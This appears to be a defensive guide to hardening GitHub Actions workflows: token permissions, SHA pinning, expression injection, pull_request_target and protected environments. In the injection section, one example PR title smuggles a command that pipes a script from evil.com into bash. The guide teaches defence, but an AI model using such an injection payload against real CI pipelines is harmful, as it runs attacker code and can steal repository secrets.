# Security hardening

The three things that bite hardest in production GitHub Actions, in priority order: **token scope, action pinning, expression injection.** Everything else is a rounding error compared to these.

## 1. `permissions:` — least privilege for `GITHUB_TOKEN`

Every workflow gets a `GITHUB_TOKEN` automatically. By default in older repos it had broad write scopes; new repos default to read. Either way, **set `permissions:` explicitly** — never rely on org defaults that an admin may change later.

### Pattern

Workflow-level default minimum:

```yaml
permissions:
  contents: read
```

Widen per-job only where needed:

```yaml
jobs:
  test:
    runs-on: ubuntu-latest
    # inherits contents: read
    steps: [...]

  release:
    runs-on: ubuntu-latest
    permissions:
      contents: write # to create a release
      id-token: write # for attestations / OIDC
    steps: [...]
```

### Common scopes and when each is needed

| Scope                    | When                                                              |
| ------------------------ | ----------------------------------------------------------------- |
| `contents: read`         | Reading repo files (every job that runs `checkout`)               |
| `contents: write`        | Pushing commits, tags, releases                                   |
| `pull-requests: write`   | Commenting on or labeling a PR                                    |
| `issues: write`          | Creating/commenting on issues                                     |
| `id-token: write`        | OIDC, artifact attestations                                       |
| `packages: write`        | Publishing to GHCR or GitHub Packages                             |
| `actions: read`          | Reading other workflow runs (e.g., from a `workflow_run` trigger) |
| `security-events: write` | Uploading SARIF for code scanning                                 |

### Override semantics (footgun)

Job-level `permissions:` **fully replaces** the workflow-level block — it doesn't merge. If your workflow sets `contents: read` and the job sets `id-token: write`, the job loses `contents: read`. Always re-declare what the job needs:

```yaml
jobs:
  release:
    permissions:
      contents: write # explicitly re-declared
      id-token: write
```

## 2. Pin actions to a full SHA

`uses: some-org/some-action@v1` resolves the `v1` tag at run time. Whoever controls that repo can move the tag to any commit — including one that exfiltrates your secrets. This has happened in real supply-chain attacks (e.g., `tj-actions/changed-files` Mar 2025).

### Pattern for pinning

```yaml
- uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1
```

Format: `@<40-char-sha> # <human-readable-version>`. The comment is what makes Dependabot able to bump it.

### Policy

- **Third-party actions**: always SHA-pin. No exceptions for "trusted" orgs — the trust model is per-commit, not per-org.
- **First-party `actions/*` and `github/*`**: SHA-pinning is the safer default. Major-tag (`@v4`) is acceptable if the user explicitly wants terseness, since GitHub itself controls these. Be consistent within a workflow.
- **Reusable workflows you own**: SHA-pin or pin to a tag protected by branch rules. `@main` is acceptable only for workflows in the same repo as the caller (no network trust boundary).

### Bulk pinning

Use `scripts/pin_actions.py` from this skill — it walks every `uses:` in a file or directory, resolves the ref via `gh api`, and rewrites in place. Idempotent. Enable Dependabot for `github-actions` so the SHAs get bumped over time.

## 3. Script injection via `${{ }}` in `run:`

Template substitution happens **before** the shell sees the command. Any attacker-controlled string in a `${{ }}` expression that lands in a `run:` block is RCE.

### Vulnerable

```yaml
- run: echo "PR title is ${{ github.event.pull_request.title }}"
#                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
#       Attacker sets PR title to: a"; curl evil.com/x.sh | bash; #
```

### Safe

```yaml
- env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "PR title is $PR_TITLE"
```

Inside `env:`, the value is set as a real environment variable. Inside `run:`, it's a shell expansion — no template substitution, no injection.

### Untrusted sources to be paranoid about

- `github.event.pull_request.title`, `.body`, `.head.ref`, `.head.label`
- `github.event.issue.title`, `.body`
- `github.event.comment.body`, `.review.body`
- `github.event.commits[*].message`, `.author.name`, `.author.email`
- `github.event.pages[*].page_name`
- `github.head_ref`, `github.event.head_commit.message`

Treat anything a user types into GitHub as hostile.

### Action inputs are also a vector

When you write a composite action that takes an input and shells it out, do the same `env:` redirect:

```yaml
inputs:
  message:
    description: Message to print
    required: true
runs:
  using: composite
  steps:
    - shell: bash
      env:
        MESSAGE: ${{ inputs.message }}
      run: echo "$MESSAGE"
```

## 4. `pull_request_target` — almost always wrong

`pull_request` runs in the context of the fork's code with **no secrets** and the read-only fork `GITHUB_TOKEN`. Safe by default.

`pull_request_target` runs in the context of the **base** repo with full secrets and a write token, but checks out (by default) the base SHA, not the PR. If you then `checkout` the PR head and run anything from it (npm install, a build script, even reading `package.json`), you've handed a fork's pull-request author your secrets.

**Rule:** Use `pull_request`. If you need to comment on or label a PR from a fork:

- Do the build in `pull_request` (no secrets).
- Upload an artifact.
- A separate `workflow_run` workflow downloads the artifact and posts the comment, with secrets but **without running fork code**.

## 5. Environments and protection rules

For anything that touches production:

```yaml
jobs:
  deploy:
    environment: production
```

In the GitHub UI for the `production` environment, set:

- **Required reviewers** — humans approve the deploy.
- **Wait timer** — minutes before deploy proceeds, lets you cancel mistakes.
- **Deployment branches** — restrict to `main` or release branches only.
- **Environment secrets** — scoped to this environment, not the whole repo.

Environment-scoped secrets and OIDC role ARNs prevent a misconfigured staging workflow from accessing prod credentials.

## 6. Artifact attestations

Generate a verifiable build provenance attestation for releases:

```yaml
permissions:
  id-token: write
  attestations: write
  contents: read

steps:
  - uses: actions/attest-build-provenance@v1 # pin to SHA
    with:
      subject-path: "dist/*.tgz"
```

Consumers can verify with `gh attestation verify dist/foo.tgz --owner <org>`. Cheap to add; bumps your SLSA level meaningfully.

## 7. Things that are NOT as critical as they sound

- **"Mask secrets in logs"** — GitHub already masks any value of a secret. The work is to avoid printing transformations of secrets (base64-encoded, sliced, etc.) which won't be masked.
- **"Use OIDC for everything"** — OIDC only helps for cloud auth (AWS/GCP/Azure/HashiCorp Vault/npm trusted publishers). It doesn't replace `GITHUB_TOKEN` or repository secrets in general.
- **"Disable Actions for forks"** — Actions on forks already need maintainer approval by default for first-time contributors. Verify the org setting, then move on.

## Hardening checklist (apply before merging any production workflow)

- [ ] `permissions:` set at workflow level, defaulted to read-only
- [ ] Every job that needs write re-declares its full permission set
- [ ] All third-party actions pinned to a 40-char SHA with version comment
- [ ] No untrusted `${{ }}` substitutions directly inside `run:`
- [ ] No `pull_request_target` unless you've thought hard about why
- [ ] Production jobs use `environment:` with reviewers and branch restrictions
- [ ] Cloud credentials use OIDC, not long-lived secrets
- [ ] Dependabot enabled for `github-actions` ecosystem
- [ ] (Releases) Build provenance attestation enabled
